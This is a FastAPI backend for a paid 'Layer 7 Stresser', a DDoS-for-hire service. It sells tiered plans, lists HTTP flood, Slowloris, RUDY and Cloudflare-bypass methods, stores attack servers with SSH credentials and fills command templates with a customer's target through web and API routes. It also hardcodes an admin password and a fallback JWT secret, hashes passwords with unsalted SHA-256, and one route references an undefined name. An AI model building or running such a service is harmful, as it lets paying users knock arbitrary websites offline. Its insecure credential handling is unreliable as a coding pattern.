from fastapi import FastAPI, APIRouter, HTTPException, Depends, Request, Header
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional, Dict
import uuid
from datetime import datetime, timezone, timedelta
import hashlib
import secrets
import jwt
import asyncio
import random
from emergentintegrations.payments.stripe.checkout import StripeCheckout, CheckoutSessionRequest

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

JWT_SECRET = os.environ.get('JWT_SECRET', 'stresser-secret-key-2024')
JWT_ALGORITHM = 'HS256'
JWT_EXPIRATION = 24 * 7

STRIPE_API_KEY = os.environ.get('STRIPE_API_KEY', 'sk_test_emergent')

app = FastAPI()
api_router = APIRouter(prefix="/api")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== MODELS ====================

class UserRegister(BaseModel):
    username: str
    password: str
    telegram_id: str

class UserLogin(BaseModel):
    username: str
    password: str

class AttackRequest(BaseModel):
    target: str
    port: int = 80
    method: str
    duration: int
    concurrents: int

class MethodCommand(BaseModel):
    method_id: str
    command: str  # e.g., "./browser {target} {duration} proxy.txt {threads}"

class ServerCreate(BaseModel):
    name: str
    host: str
    ssh_port: int = 22
    ssh_user: str = "root"
    ssh_key: Optional[str] = None
    ssh_password: Optional[str] = None
    max_concurrent: int = 100
    method_commands: List[MethodCommand]  # Custom command per method

class ServerUpdate(BaseModel):
    name: Optional[str] = None
    host: Optional[str] = None
    ssh_port: Optional[int] = None
    ssh_user: Optional[str] = None
    ssh_key: Optional[str] = None
    ssh_password: Optional[str] = None
    max_concurrent: Optional[int] = None
    method_commands: Optional[List[MethodCommand]] = None
    is_active: Optional[bool] = None
    cpu_usage: Optional[float] = None
    ram_used: Optional[float] = None
    ram_total: Optional[float] = None

class ServerStatsUpdate(BaseModel):
    cpu_usage: float
    ram_used: float
    ram_total: float

class GlobalSettingsUpdate(BaseModel):
    global_max_concurrent: Optional[int] = None
    maintenance_mode: Optional[bool] = None

class CheckoutRequest(BaseModel):
    plan_id: str
    origin_url: str

# ==================== PLANS & METHODS ====================

PLANS = {
    "free": {
        "id": "free", "name": "Free", "price": 0.0,
        "max_time": 60, "max_concurrent": 1,
        "methods": ["HTTP-GET", "HTTP-POST"],
        "features": ["60s max attack", "1 concurrent", "Basic methods"]
    },
    "basic": {
        "id": "basic", "name": "Basic", "price": 19.99,
        "max_time": 300, "max_concurrent": 3,
        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS"],
        "features": ["5min max attack", "3 concurrent", "4 methods", "Attack logs"]
    },
    "premium": {
        "id": "premium", "name": "Premium", "price": 49.99,
        "max_time": 600, "max_concurrent": 5,
        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "TLS-BYPASS", "CF-BYPASS"],
        "features": ["10min max attack", "5 concurrent", "6 methods", "API Access", "Priority"]
    },
    "enterprise": {
        "id": "enterprise", "name": "Enterprise", "price": 99.99,
        "max_time": 1200, "max_concurrent": 10,
        "methods": ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "TLS-BYPASS", "CF-BYPASS", "BROWSER-EMU", "RUDY"],
        "features": ["20min max attack", "10 concurrent", "All methods", "API Access", "24/7 Support"]
    }
}

DEFAULT_ATTACK_METHODS = [
    {"id": "HTTP-GET", "name": "HTTP GET Flood", "description": "Layer 7 GET request flood", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "HTTP-POST", "name": "HTTP POST Flood", "description": "Layer 7 POST request flood", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "HTTP-HEAD", "name": "HTTP HEAD", "description": "Layer 7 HEAD request flood", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "SLOWLORIS", "name": "Slowloris", "description": "Layer 7 slow HTTP attack", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "TLS-BYPASS", "name": "TLS Bypass", "description": "Layer 7 TLS/SSL bypass attack", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "CF-BYPASS", "name": "CF Bypass", "description": "Layer 7 Cloudflare bypass", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "BROWSER-EMU", "name": "Browser Emulation", "description": "Layer 7 browser simulation", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]},
    {"id": "RUDY", "name": "R-U-Dead-Yet", "description": "Layer 7 slow POST attack", "placeholders": ["{target}", "{port}", "{duration}", "{threads}"]}
]

class MethodCreate(BaseModel):
    id: str
    name: str
    description: str = ""

class MethodUpdate(BaseModel):
    name: Optional[str] = None
    description: Optional[str] = None

# ==================== HELPERS ====================

def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

def generate_api_key() -> str:
    return f"strs_{secrets.token_hex(32)}"

def create_token(user_id: str, role: str) -> str:
    payload = {
        "user_id": user_id,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=JWT_EXPIRATION)
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)

def verify_token(token: str) -> dict:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

async def get_current_user(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing or invalid token")
    token = authorization.split(" ")[1]
    payload = verify_token(token)
    user = await db.users.find_one({"id": payload["user_id"]}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=401, detail="User not found")
    return user

async def get_admin_user(user: dict = Depends(get_current_user)):
    if user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Admin access required")
    return user

async def get_global_settings():
    settings = await db.settings.find_one({"type": "global"}, {"_id": 0})
    if not settings:
        settings = {"type": "global", "global_max_concurrent": 500, "maintenance_mode": False}
        await db.settings.insert_one(settings)
    return settings

# ==================== INIT ====================

async def init_admin():
    admin = await db.users.find_one({"username": "admin"})
    if not admin:
        admin_user = {
            "id": str(uuid.uuid4()),
            "username": "admin",
            "password_hash": hash_password("Admin123!"),
            "telegram_id": "@admin",
            "role": "admin",
            "plan": "enterprise",
            "plan_expires": None,
            "api_key": generate_api_key(),
            "created_at": datetime.now(timezone.utc).isoformat()
        }
        await db.users.insert_one(admin_user)
        logger.info("Admin user created: admin / Admin123!")

async def init_methods():
    """Initialize default attack methods in database if not present"""
    existing = await db.attack_methods.count_documents({})
    if existing == 0:
        for method in DEFAULT_ATTACK_METHODS:
            await db.attack_methods.insert_one(method)
        logger.info(f"Initialized {len(DEFAULT_ATTACK_METHODS)} default attack methods")

@app.on_event("startup")
async def startup_event():
    await init_admin()
    await init_methods()
    await get_global_settings()

# ==================== AUTH ROUTES ====================

@api_router.post("/auth/register")
async def register(data: UserRegister):
    existing = await db.users.find_one({"username": data.username})
    if existing:
        raise HTTPException(status_code=400, detail="Username already exists")
    
    user_id = str(uuid.uuid4())
    user = {
        "id": user_id,
        "username": data.username,
        "password_hash": hash_password(data.password),
        "telegram_id": data.telegram_id,
        "role": "user",
        "plan": "free",
        "plan_expires": None,
        "api_key": generate_api_key(),
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.users.insert_one(user)
    
    token = create_token(user_id, "user")
    return {
        "token": token,
        "user": {
            "id": user_id, "username": data.username, "telegram_id": data.telegram_id,
            "role": "user", "plan": "free", "api_key": user["api_key"]
        }
    }

@api_router.post("/auth/login")
async def login(data: UserLogin):
    user = await db.users.find_one({"username": data.username}, {"_id": 0})
    if not user or user["password_hash"] != hash_password(data.password):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    token = create_token(user["id"], user["role"])
    return {
        "token": token,
        "user": {
            "id": user["id"], "username": user["username"], "telegram_id": user["telegram_id"],
            "role": user["role"], "plan": user["plan"], "plan_expires": user.get("plan_expires"),
            "api_key": user.get("api_key")
        }
    }

@api_router.get("/auth/me")
async def get_me(user: dict = Depends(get_current_user)):
    return {
        "id": user["id"], "username": user["username"], "telegram_id": user["telegram_id"],
        "role": user["role"], "plan": user["plan"], "plan_expires": user.get("plan_expires"),
        "api_key": user.get("api_key")
    }

@api_router.post("/auth/regenerate-key")
async def regenerate_api_key(user: dict = Depends(get_current_user)):
    new_key = generate_api_key()
    await db.users.update_one({"id": user["id"]}, {"$set": {"api_key": new_key}})
    return {"api_key": new_key}

# ==================== PUBLIC ROUTES ====================

@api_router.get("/plans")
async def get_plans():
    return list(PLANS.values())

@api_router.get("/methods")
async def get_methods():
    return ATTACK_METHODS

@api_router.get("/public/stats")
async def get_public_stats():
    now = datetime.now(timezone.utc)
    day_ago = (now - timedelta(days=1)).isoformat()
    
    total_users = await db.users.count_documents({})
    paid_users = await db.users.count_documents({"plan": {"$ne": "free"}})
    total_attacks = await db.attacks.count_documents({})
    attacks_24h = await db.attacks.count_documents({"started_at": {"$gte": day_ago}})
    
    servers = await db.attack_servers.find({"is_active": True}, {"_id": 0}).to_list(100)
    online_servers = [s for s in servers if s.get("status") == "online"]
    
    total_capacity = sum(s.get("max_concurrent", 0) for s in online_servers)
    current_load = await db.attacks.count_documents({"status": "running"})
    
    # Calculate total CPU and RAM
    total_cpu = sum(s.get("cpu_usage", 0) for s in online_servers) / max(len(online_servers), 1)
    total_ram_used = sum(s.get("ram_used", 0) for s in online_servers)
    total_ram_total = sum(s.get("ram_total", 0) for s in online_servers)
    
    # Hourly attacks for last 24 hours (for public display)
    attacks_per_hour = []
    for i in range(24):
        hour_start = now - timedelta(hours=i+1)
        hour_end = now - timedelta(hours=i)
        count = await db.attacks.count_documents({
            "started_at": {"$gte": hour_start.isoformat(), "$lt": hour_end.isoformat()}
        })
        attacks_per_hour.append({
            "hour": hour_end.strftime("%H:00"),
            "attacks": count
        })
    attacks_per_hour.reverse()
    
    return {
        "total_users": total_users,
        "paid_users": paid_users,
        "total_attacks": total_attacks,
        "attacks_24h": attacks_24h,
        "online_servers": len(online_servers),
        "total_servers": len(servers),
        "total_capacity": total_capacity,
        "current_load": current_load,
        "avg_cpu": round(total_cpu, 1),
        "total_ram_used": round(total_ram_used, 1),
        "total_ram_total": round(total_ram_total, 1),
        "attacks_per_hour": attacks_per_hour,
        "servers": [
            {
                "name": s["name"],
                "status": s.get("status", "offline"),
                "load": s.get("current_load", 0),
                "max_concurrent": s.get("max_concurrent", 0),
                "cpu_usage": s.get("cpu_usage", 0),
                "ram_used": s.get("ram_used", 0),
                "ram_total": s.get("ram_total", 0),
                "methods": list(s.get("method_commands", {}).keys()) if isinstance(s.get("method_commands"), dict) else [mc.get("method_id") for mc in s.get("method_commands", [])]
            }
            for s in servers
        ]
    }

# ==================== ATTACK ROUTES ====================

async def select_best_server(method: str, concurrents: int):
    servers = await db.attack_servers.find({
        "is_active": True,
        "status": "online"
    }, {"_id": 0}).to_list(100)
    
    # Filter servers that support this method
    valid_servers = []
    for server in servers:
        method_commands = server.get("method_commands", [])
        if isinstance(method_commands, list):
            methods = [mc.get("method_id") for mc in method_commands]
        else:
            methods = list(method_commands.keys())
        if method in methods:
            valid_servers.append(server)
    
    if not valid_servers:
        return None
    
    for server in valid_servers:
        server["available"] = server.get("max_concurrent", 0) - server.get("current_load", 0)
    
    valid_servers.sort(key=lambda x: x["available"], reverse=True)
    
    best = valid_servers[0]
    if best["available"] >= concurrents:
        return best
    return None

def build_attack_command(server: dict, attack: dict) -> str:
    method_commands = server.get("method_commands", [])
    command_template = None
    
    if isinstance(method_commands, list):
        for mc in method_commands:
            if mc.get("method_id") == attack["method"]:
                command_template = mc.get("command")
                break
    else:
        command_template = method_commands.get(attack["method"])
    
    if not command_template:
        return None
    
    # Replace placeholders
    command = command_template.replace("{target}", str(attack["target"]))
    command = command.replace("{port}", str(attack["port"]))
    command = command.replace("{duration}", str(attack["duration"]))
    command = command.replace("{threads}", str(attack["concurrents"]))
    command = command.replace("{time}", str(attack["duration"]))
    command = command.replace("{site}", str(attack["target"]))
    
    return command

async def execute_attack_on_server(server: dict, attack: dict):
    command = build_attack_command(server, attack)
    if not command:
        return False, None
    
    logger.info(f"Attack command for server {server['name']}: {command}")
    
    await db.attack_servers.update_one(
        {"id": server["id"]},
        {"$inc": {"current_load": attack["concurrents"]}}
    )
    
    return True, command

async def release_server_load(server_id: str, concurrents: int):
    await db.attack_servers.update_one(
        {"id": server_id},
        {"$inc": {"current_load": -concurrents}}
    )
    # Ensure load doesn't go negative
    await db.attack_servers.update_one(
        {"id": server_id, "current_load": {"$lt": 0}},
        {"$set": {"current_load": 0}}
    )

@api_router.post("/attacks")
async def create_attack(data: AttackRequest, user: dict = Depends(get_current_user)):
    settings = await get_global_settings()
    
    if settings.get("maintenance_mode"):
        raise HTTPException(status_code=503, detail="System is under maintenance")
    
    user_plan = PLANS.get(user["plan"], PLANS["free"])
    
    if data.duration > user_plan["max_time"]:
        raise HTTPException(status_code=400, detail=f"Max duration: {user_plan['max_time']}s")
    if data.concurrents > user_plan["max_concurrent"]:
        raise HTTPException(status_code=400, detail=f"Max concurrent: {user_plan['max_concurrent']}")
    if data.method not in user_plan["methods"]:
        raise HTTPException(status_code=400, detail="Method not available in your plan")
    
    user_running = await db.attacks.count_documents({"user_id": user["id"], "status": "running"})
    if user_running >= user_plan["max_concurrent"]:
        raise HTTPException(status_code=400, detail="Max concurrent attacks reached")
    
    global_running = await db.attacks.count_documents({"status": "running"})
    if global_running >= settings.get("global_max_concurrent", 500):
        raise HTTPException(status_code=503, detail="Global capacity reached")
    
    server = await select_best_server(data.method, data.concurrents)
    if not server:
        raise HTTPException(status_code=503, detail="No available servers for this method")
    
    attack_id = str(uuid.uuid4())
    attack = {
        "id": attack_id,
        "user_id": user["id"],
        "target": data.target,
        "port": data.port,
        "method": data.method,
        "duration": data.duration,
        "concurrents": data.concurrents,
        "server_id": server["id"],
        "server_name": server["name"],
        "status": "running",
        "started_at": datetime.now(timezone.utc).isoformat(),
        "ended_at": None,
        "command": None
    }
    
    success, command = await execute_attack_on_server(server, attack)
    attack["command"] = command
    
    if not success:
        raise HTTPException(status_code=500, detail="Failed to start attack")
    
    await db.attacks.insert_one(attack)
    asyncio.create_task(schedule_attack_end(attack_id, server["id"], data.concurrents, data.duration))
    
    return {"id": attack_id, "status": "running", "server": server["name"], "command": command}

async def schedule_attack_end(attack_id: str, server_id: str, concurrents: int, duration: int):
    await asyncio.sleep(duration)
    attack = await db.attacks.find_one({"id": attack_id}, {"_id": 0})
    if attack and attack["status"] == "running":
        await db.attacks.update_one(
            {"id": attack_id},
            {"$set": {"status": "completed", "ended_at": datetime.now(timezone.utc).isoformat()}}
        )
        await release_server_load(server_id, concurrents)

@api_router.post("/attacks/{attack_id}/stop")
async def stop_attack(attack_id: str, user: dict = Depends(get_current_user)):
    attack = await db.attacks.find_one({"id": attack_id, "user_id": user["id"]}, {"_id": 0})
    if not attack:
        raise HTTPException(status_code=404, detail="Attack not found")
    if attack["status"] != "running":
        raise HTTPException(status_code=400, detail="Attack is not running")
    
    await db.attacks.update_one(
        {"id": attack_id},
        {"$set": {"status": "stopped", "ended_at": datetime.now(timezone.utc).isoformat()}}
    )
    await release_server_load(attack["server_id"], attack["concurrents"])
    return {"message": "Attack stopped"}

@api_router.get("/attacks")
async def get_attacks(user: dict = Depends(get_current_user), limit: int = 50):
    attacks = await db.attacks.find(
        {"user_id": user["id"]}, {"_id": 0}
    ).sort("started_at", -1).limit(limit).to_list(limit)
    return attacks

@api_router.get("/attacks/running")
async def get_running_attacks(user: dict = Depends(get_current_user)):
    attacks = await db.attacks.find(
        {"user_id": user["id"], "status": "running"}, {"_id": 0}
    ).to_list(100)
    return attacks

# ==================== ADMIN - SERVERS ====================

@api_router.get("/admin/servers")
async def admin_get_servers(admin: dict = Depends(get_admin_user)):
    servers = await db.attack_servers.find({}, {"_id": 0}).to_list(100)
    return servers

@api_router.post("/admin/servers")
async def admin_create_server(data: ServerCreate, admin: dict = Depends(get_admin_user)):
    server_id = str(uuid.uuid4())
    
    # Convert method_commands list to dict for easier lookup
    method_commands_list = [{"method_id": mc.method_id, "command": mc.command} for mc in data.method_commands]
    
    server = {
        "id": server_id,
        "name": data.name,
        "host": data.host,
        "ssh_port": data.ssh_port,
        "ssh_user": data.ssh_user,
        "ssh_key": data.ssh_key,
        "ssh_password": data.ssh_password,
        "max_concurrent": data.max_concurrent,
        "current_load": 0,
        "method_commands": method_commands_list,
        "is_active": True,
        "status": "offline",
        "cpu_usage": 0,
        "ram_used": 0,
        "ram_total": 0,
        "last_ping": None,
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.attack_servers.insert_one(server)
    return {"id": server_id, "message": "Server created"}

@api_router.put("/admin/servers/{server_id}")
async def admin_update_server(server_id: str, data: ServerUpdate, admin: dict = Depends(get_admin_user)):
    update_data = {}
    for k, v in data.model_dump().items():
        if v is not None:
            if k == "method_commands":
                update_data[k] = [{"method_id": mc.method_id, "command": mc.command} for mc in v]
            else:
                update_data[k] = v
    
    if not update_data:
        raise HTTPException(status_code=400, detail="No data to update")
    
    result = await db.attack_servers.update_one({"id": server_id}, {"$set": update_data})
    if result.modified_count == 0:
        raise HTTPException(status_code=404, detail="Server not found")
    return {"message": "Server updated"}

@api_router.delete("/admin/servers/{server_id}")
async def admin_delete_server(server_id: str, admin: dict = Depends(get_admin_user)):
    result = await db.attack_servers.delete_one({"id": server_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Server not found")
    return {"message": "Server deleted"}

@api_router.post("/admin/servers/{server_id}/ping")
async def admin_ping_server(server_id: str, admin: dict = Depends(get_admin_user)):
    server = await db.attack_servers.find_one({"id": server_id}, {"_id": 0})
    if not server:
        raise HTTPException(status_code=404, detail="Server not found")
    
    # Simulate ping with random stats (in production, would actually ping)
    is_online = random.random() > 0.1
    cpu_usage = round(random.uniform(10, 80), 1) if is_online else 0
    ram_used = round(random.uniform(2, 12), 1) if is_online else 0
    ram_total = 16.0
    
    await db.attack_servers.update_one(
        {"id": server_id},
        {"$set": {
            "status": "online" if is_online else "offline",
            "cpu_usage": cpu_usage,
            "ram_used": ram_used,
            "ram_total": ram_total,
            "last_ping": datetime.now(timezone.utc).isoformat()
        }}
    )
    return {"status": "online" if is_online else "offline", "cpu_usage": cpu_usage, "ram_used": ram_used, "ram_total": ram_total}

@api_router.post("/admin/servers/{server_id}/stats")
async def admin_update_server_stats(server_id: str, data: ServerStatsUpdate, admin: dict = Depends(get_admin_user)):
    """Manual update of server stats (for external monitoring)"""
    await db.attack_servers.update_one(
        {"id": server_id},
        {"$set": {
            "cpu_usage": data.cpu_usage,
            "ram_used": data.ram_used,
            "ram_total": data.ram_total,
            "last_ping": datetime.now(timezone.utc).isoformat()
        }}
    )
    return {"message": "Stats updated"}

# ==================== ADMIN - SETTINGS ====================

@api_router.get("/admin/settings")
async def admin_get_settings(admin: dict = Depends(get_admin_user)):
    return await get_global_settings()

@api_router.put("/admin/settings")
async def admin_update_settings(data: GlobalSettingsUpdate, admin: dict = Depends(get_admin_user)):
    update_data = {k: v for k, v in data.model_dump().items() if v is not None}
    if not update_data:
        raise HTTPException(status_code=400, detail="No data to update")
    
    await db.settings.update_one({"type": "global"}, {"$set": update_data})
    return {"message": "Settings updated"}

# ==================== ADMIN - STATS ====================

@api_router.get("/admin/stats")
async def admin_get_stats(admin: dict = Depends(get_admin_user)):
    now = datetime.now(timezone.utc)
    day_ago = (now - timedelta(days=1)).isoformat()
    
    total_users = await db.users.count_documents({})
    users_today = await db.users.count_documents({"created_at": {"$gte": day_ago}})
    paid_users = await db.users.count_documents({"plan": {"$ne": "free"}})
    
    total_attacks = await db.attacks.count_documents({})
    attacks_24h = await db.attacks.count_documents({"started_at": {"$gte": day_ago}})
    running_attacks = await db.attacks.count_documents({"status": "running"})
    
    paid_transactions = await db.payment_transactions.find(
        {"payment_status": "paid"}, {"_id": 0, "amount": 1}
    ).to_list(10000)
    total_revenue = sum(t.get("amount", 0) for t in paid_transactions)
    
    plan_distribution = {}
    for plan_id in PLANS.keys():
        count = await db.users.count_documents({"plan": plan_id})
        plan_distribution[plan_id] = count
    
    # Hourly attacks for last 24 hours
    attacks_per_hour = []
    for i in range(24):
        hour_start = now - timedelta(hours=i+1)
        hour_end = now - timedelta(hours=i)
        count = await db.attacks.count_documents({
            "started_at": {"$gte": hour_start.isoformat(), "$lt": hour_end.isoformat()}
        })
        
        # Get previous hour count for trend
        prev_hour_start = hour_start - timedelta(hours=1)
        prev_count = await db.attacks.count_documents({
            "started_at": {"$gte": prev_hour_start.isoformat(), "$lt": hour_start.isoformat()}
        })
        
        trend = "up" if count > prev_count else ("down" if count < prev_count else "same")
        
        attacks_per_hour.append({
            "hour": hour_end.strftime("%H:00"),
            "attacks": count,
            "trend": trend,
            "change": count - prev_count
        })
    attacks_per_hour.reverse()
    
    # Server stats
    servers = await db.attack_servers.find({}, {"_id": 0}).to_list(100)
    online_servers = [s for s in servers if s.get("status") == "online"]
    total_capacity = sum(s.get("max_concurrent", 0) for s in online_servers)
    avg_cpu = sum(s.get("cpu_usage", 0) for s in online_servers) / max(len(online_servers), 1)
    total_ram_used = sum(s.get("ram_used", 0) for s in online_servers)
    total_ram_total = sum(s.get("ram_total", 0) for s in online_servers)
    
    return {
        "total_users": total_users,
        "users_today": users_today,
        "paid_users": paid_users,
        "total_attacks": total_attacks,
        "attacks_24h": attacks_24h,
        "running_attacks": running_attacks,
        "total_revenue": total_revenue,
        "plan_distribution": plan_distribution,
        "attacks_per_hour": attacks_per_hour,
        "online_servers": len(online_servers),
        "total_servers": len(servers),
        "total_capacity": total_capacity,
        "avg_cpu": round(avg_cpu, 1),
        "total_ram_used": round(total_ram_used, 1),
        "total_ram_total": round(total_ram_total, 1)
    }

@api_router.get("/admin/users")
async def admin_get_users(admin: dict = Depends(get_admin_user), limit: int = 100, search: str = None):
    query = {}
    if search:
        query = {"$or": [
            {"username": {"$regex": search, "$options": "i"}},
            {"telegram_id": {"$regex": search, "$options": "i"}}
        ]}
    users = await db.users.find(query, {"_id": 0, "password_hash": 0}).limit(limit).to_list(limit)
    return users

@api_router.get("/admin/users/{user_id}")
async def admin_get_user(user_id: str, admin: dict = Depends(get_admin_user)):
    user = await db.users.find_one({"id": user_id}, {"_id": 0, "password_hash": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    return user

@api_router.get("/admin/attacks")
async def admin_get_attacks(admin: dict = Depends(get_admin_user), limit: int = 100):
    attacks = await db.attacks.find({}, {"_id": 0}).sort("started_at", -1).limit(limit).to_list(limit)
    return attacks

@api_router.post("/admin/users/{user_id}/plan")
async def admin_update_user_plan(user_id: str, plan_id: str, admin: dict = Depends(get_admin_user)):
    if plan_id not in PLANS:
        raise HTTPException(status_code=400, detail="Invalid plan")
    
    plan_expires = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat() if plan_id != "free" else None
    await db.users.update_one({"id": user_id}, {"$set": {"plan": plan_id, "plan_expires": plan_expires}})
    return {"message": "Plan updated"}

class PlanExpirationUpdate(BaseModel):
    plan_expires: str  # ISO date string

@api_router.put("/admin/users/{user_id}/expiration")
async def admin_update_user_expiration(user_id: str, data: PlanExpirationUpdate, admin: dict = Depends(get_admin_user)):
    """Update user's plan expiration date"""
    user = await db.users.find_one({"id": user_id}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    await db.users.update_one({"id": user_id}, {"$set": {"plan_expires": data.plan_expires}})
    return {"message": "Expiration date updated"}

@api_router.post("/admin/users/{user_id}/role")
async def admin_update_user_role(user_id: str, role: str, admin: dict = Depends(get_admin_user)):
    if role not in ["user", "admin"]:
        raise HTTPException(status_code=400, detail="Invalid role")
    await db.users.update_one({"id": user_id}, {"$set": {"role": role}})
    return {"message": "Role updated"}

# ==================== PAYMENT ROUTES ====================

@api_router.post("/checkout")
async def create_checkout(data: CheckoutRequest, request: Request, user: dict = Depends(get_current_user)):
    plan = PLANS.get(data.plan_id)
    if not plan:
        raise HTTPException(status_code=400, detail="Invalid plan")
    if plan["price"] == 0:
        raise HTTPException(status_code=400, detail="Cannot checkout free plan")
    
    host_url = str(request.base_url).rstrip('/')
    webhook_url = f"{host_url}/api/webhook/stripe"
    
    stripe_checkout = StripeCheckout(api_key=STRIPE_API_KEY, webhook_url=webhook_url)
    
    success_url = f"{data.origin_url}/payment/success?session_id={{CHECKOUT_SESSION_ID}}"
    cancel_url = f"{data.origin_url}/plans"
    
    checkout_request = CheckoutSessionRequest(
        amount=plan["price"],
        currency="usd",
        success_url=success_url,
        cancel_url=cancel_url,
        metadata={"user_id": user["id"], "plan_id": data.plan_id, "plan_name": plan["name"]},
        payment_methods=["card", "crypto"]
    )
    
    session = await stripe_checkout.create_checkout_session(checkout_request)
    
    transaction = {
        "id": str(uuid.uuid4()),
        "session_id": session.session_id,
        "user_id": user["id"],
        "plan_id": data.plan_id,
        "amount": plan["price"],
        "currency": "usd",
        "status": "pending",
        "payment_status": "initiated",
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.payment_transactions.insert_one(transaction)
    
    return {"url": session.url, "session_id": session.session_id}

@api_router.get("/checkout/status/{session_id}")
async def get_checkout_status(session_id: str, request: Request, user: dict = Depends(get_current_user)):
    host_url = str(request.base_url).rstrip('/')
    webhook_url = f"{host_url}/api/webhook/stripe"
    
    stripe_checkout = StripeCheckout(api_key=STRIPE_API_KEY, webhook_url=webhook_url)
    
    try:
        status = await stripe_checkout.get_checkout_status(session_id)
        
        transaction = await db.payment_transactions.find_one({"session_id": session_id}, {"_id": 0})
        if transaction and transaction.get("payment_status") != "paid":
            if status.payment_status == "paid":
                plan_expires = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat()
                await db.users.update_one(
                    {"id": transaction["user_id"]},
                    {"$set": {"plan": transaction["plan_id"], "plan_expires": plan_expires}}
                )
                await db.payment_transactions.update_one(
                    {"session_id": session_id},
                    {"$set": {"status": "completed", "payment_status": "paid"}}
                )
        
        return {"status": status.status, "payment_status": status.payment_status}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@api_router.post("/webhook/stripe")
async def stripe_webhook(request: Request):
    body = await request.body()
    signature = request.headers.get("Stripe-Signature")
    
    host_url = str(request.base_url).rstrip('/')
    webhook_url = f"{host_url}/api/webhook/stripe"
    stripe_checkout = StripeCheckout(api_key=STRIPE_API_KEY, webhook_url=webhook_url)
    
    try:
        webhook_response = await stripe_checkout.handle_webhook(body, signature)
        
        if webhook_response.payment_status == "paid":
            session_id = webhook_response.session_id
            transaction = await db.payment_transactions.find_one({"session_id": session_id}, {"_id": 0})
            if transaction and transaction.get("payment_status") != "paid":
                plan_expires = (datetime.now(timezone.utc) + timedelta(days=30)).isoformat()
                await db.users.update_one(
                    {"id": transaction["user_id"]},
                    {"$set": {"plan": transaction["plan_id"], "plan_expires": plan_expires}}
                )
                await db.payment_transactions.update_one(
                    {"session_id": session_id},
                    {"$set": {"status": "completed", "payment_status": "paid"}}
                )
        
        return {"received": True}
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {"received": True}

# ==================== API KEY AUTH ====================

@api_router.post("/v1/attack")
async def api_attack(data: AttackRequest, x_api_key: str = Header(None)):
    if not x_api_key:
        raise HTTPException(status_code=401, detail="API key required")
    
    user = await db.users.find_one({"api_key": x_api_key}, {"_id": 0})
    if not user:
        raise HTTPException(status_code=401, detail="Invalid API key")
    
    if user["plan"] not in ["premium", "enterprise"]:
        raise HTTPException(status_code=403, detail="API requires Premium or Enterprise")
    
    settings = await get_global_settings()
    if settings.get("maintenance_mode"):
        raise HTTPException(status_code=503, detail="System under maintenance")
    
    user_plan = PLANS.get(user["plan"], PLANS["free"])
    
    if data.duration > user_plan["max_time"]:
        raise HTTPException(status_code=400, detail=f"Max duration: {user_plan['max_time']}s")
    if data.concurrents > user_plan["max_concurrent"]:
        raise HTTPException(status_code=400, detail=f"Max concurrent: {user_plan['max_concurrent']}")
    if data.method not in user_plan["methods"]:
        raise HTTPException(status_code=400, detail="Method not available")
    
    server = await select_best_server(data.method, data.concurrents)
    if not server:
        raise HTTPException(status_code=503, detail="No available servers")
    
    attack_id = str(uuid.uuid4())
    attack = {
        "id": attack_id,
        "user_id": user["id"],
        "target": data.target,
        "port": data.port,
        "method": data.method,
        "duration": data.duration,
        "concurrents": data.concurrents,
        "server_id": server["id"],
        "server_name": server["name"],
        "status": "running",
        "started_at": datetime.now(timezone.utc).isoformat(),
        "ended_at": None,
        "via_api": True
    }
    
    success, command = await execute_attack_on_server(server, attack)
    attack["command"] = command
    
    await db.attacks.insert_one(attack)
    asyncio.create_task(schedule_attack_end(attack_id, server["id"], data.concurrents, data.duration))
    
    return {"id": attack_id, "status": "running", "server": server["name"], "command": command}

@api_router.get("/")
async def root():
    return {"message": "Layer 7 Stresser API", "version": "2.1.0"}

app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
